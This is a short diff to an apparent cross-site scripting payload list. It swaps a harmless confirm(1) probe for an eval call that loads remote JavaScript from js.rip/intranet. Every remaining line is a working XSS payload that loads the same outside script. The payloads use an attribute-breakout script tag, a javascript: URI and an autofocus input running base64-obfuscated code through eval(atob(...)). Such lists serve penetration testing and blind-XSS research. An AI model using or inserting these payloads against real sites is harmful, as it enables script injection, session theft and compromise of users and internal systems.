@@ -1,4 +1,4 @@
-?0="*/confirm%0(1)</Script/--><Script>/*
+?0="*/eval%0('var a=document.createElement(\'script\');a.src=\'https://js.rip/intranet\';document.body.appendChild(a)')</Script/--><Script>/*
 "><script src="https://js.rip/intranet"></script>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/intranet\';document.body.appendChild(a)')
 "><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2ludHJhbmV0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw autofocus>
